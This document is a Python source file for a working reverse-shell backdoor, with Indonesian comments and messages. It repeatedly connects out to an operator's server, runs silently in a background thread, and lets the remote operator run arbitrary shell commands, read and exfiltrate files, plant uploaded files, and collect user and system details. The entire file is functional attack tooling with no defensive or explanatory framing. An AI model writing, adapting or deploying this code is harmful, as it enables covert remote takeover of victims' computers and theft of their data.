import socket
import os
import platform
import subprocess
import threading
import time
import getpass

SERVER = '127.0.0.1'  # Ganti ke IP server kamu
PORT = 80
BUFFER = 4096

def send_file(s, filepath):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        s.send(str(len(data)).encode() + b'\n')
        s.sendall(data)
    except Exception:
        s.send(b"0\n")

def receive_file(s, filename):
    try:
        size = int(s.recv(BUFFER).decode())
        with open(filename, 'wb') as f:
            while size > 0:
                chunk = s.recv(min(BUFFER, size))
                if not chunk:
                    break
                f.write(chunk)
                size -= len(chunk)
        s.send(b"[+] Upload selesai\n")
    except:
        s.send(b"[!] Gagal upload\n")

def handle_server(s):
    while True:
        try:
            cmd = s.recv(BUFFER).decode(errors='ignore').strip()
            if not cmd:
                continue

            if cmd == "exit":
                break
            elif cmd == "pwd":
                s.send(os.getcwd().encode() + b'\n')
            elif cmd.startswith("cd "):
                try:
                    os.chdir(cmd[3:])
                    s.send(b"[+] Direktori berubah\n")
                except Exception as e:
                    s.send(f"[!] Gagal pindah direktori: {e}\n".encode())
            elif cmd == "ls":
                try:
                    items = os.listdir()
                    s.send("\n".join(items).encode() + b'\n')
                except Exception as e:
                    s.send(f"[!] Error listing file: {e}\n".encode())
            elif cmd.startswith("download "):
                filepath = cmd.split(" ", 1)[1]
                send_file(s, filepath)
            elif cmd.startswith("upload "):
                filename = cmd.split(" ", 1)[1]
                receive_file(s, filename)
            elif cmd == "whoami":
                try:
                    s.send(getpass.getuser().encode() + b'\n')
                except:
                    s.send(b"[?] Gagal ambil user\n")
            elif cmd == "sysinfo":
                info = f"{platform.system()} {platform.release()} {platform.version()}"
                s.send(info.encode() + b'\n')
            elif cmd.startswith("shell "):
                try:
                    output = subprocess.check_output(cmd[6:], shell=True, stderr=subprocess.STDOUT)
                    s.send(output + b'\n')
                except subprocess.CalledProcessError as e:
                    s.send(e.output + b'\n')
            else:
                s.send(f"[?] Perintah tidak dikenal: {cmd}\n".encode())
        except Exception:
            break
    s.close()

def connect():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((SERVER, PORT))
                handle_server(s)
        except Exception:
            time.sleep(5)
            continue

if __name__ == "__main__":
    threading.Thread(target=connect, daemon=True).start()
    while True:
        time.sleep(9999)
